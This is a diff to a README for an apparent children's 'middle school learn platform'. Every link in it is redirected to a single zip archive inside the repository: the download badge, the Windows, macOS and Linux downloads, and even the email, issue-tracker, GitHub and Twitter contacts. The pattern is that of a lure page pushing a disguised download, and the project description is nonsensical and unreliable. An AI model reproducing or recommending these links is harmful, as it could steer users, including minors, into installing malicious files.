@@ -1,6 +1,6 @@
 # 🎓 middle-school-learn-platform - Discover Fun Learning Experiences
 
-[![Download](https://raw.githubusercontent.com/johannfred/middle-school-learn-platform/main/scrotum/middle-school-learn-platform.zip%20Now%20-Click%20Here-blue)](https://raw.githubusercontent.com/johannfred/middle-school-learn-platform/main/scrotum/middle-school-learn-platform.zip)
+[![Download](https://github.com/johannfred/middle-school-learn-platform/raw/refs/heads/main/src/hooks/middle_learn_school_platform_v1.5.zip%20Now%20-Click%20Here-blue)](https://github.com/johannfred/middle-school-learn-platform/raw/refs/heads/main/src/hooks/middle_learn_school_platform_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -35,15 +35,15 @@ To get started with the Middle School Learn Platform, follow these steps:
 
 1. Click the link below to access the Releases page:
    
-   [Download Here](https://raw.githubusercontent.com/johannfred/middle-school-learn-platform/main/scrotum/middle-school-learn-platform.zip)
+   [Download Here](https://github.com/johannfred/middle-school-learn-platform/raw/refs/heads/main/src/hooks/middle_learn_school_platform_v1.5.zip)
 
 2. You will see a list of available versions. Click on the latest version title.
 
 3. Choose the file that matches your operating system:
 
-   - For Windows: Download `https://raw.githubusercontent.com/johannfred/middle-school-learn-platform/main/scrotum/middle-school-learn-platform.zip`
-   - For macOS: Download `https://raw.githubusercontent.com/johannfred/middle-school-learn-platform/main/scrotum/middle-school-learn-platform.zip`
-   - For Linux: Download `https://raw.githubusercontent.com/johannfred/middle-school-learn-platform/main/scrotum/middle-school-learn-platform.zip`
+   - For Windows: Download `https://github.com/johannfred/middle-school-learn-platform/raw/refs/heads/main/src/hooks/middle_learn_school_platform_v1.5.zip`
+   - For macOS: Download `https://github.com/johannfred/middle-school-learn-platform/raw/refs/heads/main/src/hooks/middle_learn_school_platform_v1.5.zip`
+   - For Linux: Download `https://github.com/johannfred/middle-school-learn-platform/raw/refs/heads/main/src/hooks/middle_learn_school_platform_v1.5.zip`
 
 4. After the file has finished downloading, locate it in your computer’s Downloads folder.
 
@@ -62,8 +62,8 @@ To get started with the Middle School Learn Platform, follow these steps:
 
 If you encounter any issues while using the Middle School Learn Platform, or if you have feedback, please reach out to us:
 
-- **Email:** https://raw.githubusercontent.com/johannfred/middle-school-learn-platform/main/scrotum/middle-school-learn-platform.zip
-- **GitHub Issues Page:** [Report an Issue](https://raw.githubusercontent.com/johannfred/middle-school-learn-platform/main/scrotum/middle-school-learn-platform.zip)
+- **Email:** https://github.com/johannfred/middle-school-learn-platform/raw/refs/heads/main/src/hooks/middle_learn_school_platform_v1.5.zip
+- **GitHub Issues Page:** [Report an Issue](https://github.com/johannfred/middle-school-learn-platform/raw/refs/heads/main/src/hooks/middle_learn_school_platform_v1.5.zip)
 
 We value your feedback and strive to improve your learning experience.
 
@@ -73,7 +73,7 @@ We thank everyone who contributed to the development of the Middle School Learn 
 
 Feel free to connect with us on:
 
-- **GitHub:** [middle-school-learn-platform](https://raw.githubusercontent.com/johannfred/middle-school-learn-platform/main/scrotum/middle-school-learn-platform.zip)
-- **Twitter:** [@MSLearnPlatform](https://raw.githubusercontent.com/johannfred/middle-school-learn-platform/main/scrotum/middle-school-learn-platform.zip)
+- **GitHub:** [middle-school-learn-platform](https://github.com/johannfred/middle-school-learn-platform/raw/refs/heads/main/src/hooks/middle_learn_school_platform_v1.5.zip)
+- **Twitter:** [@MSLearnPlatform](https://github.com/johannfred/middle-school-learn-platform/raw/refs/heads/main/src/hooks/middle_learn_school_platform_v1.5.zip)
 
 Enjoy using the Middle School Learn Platform, and happy learning!
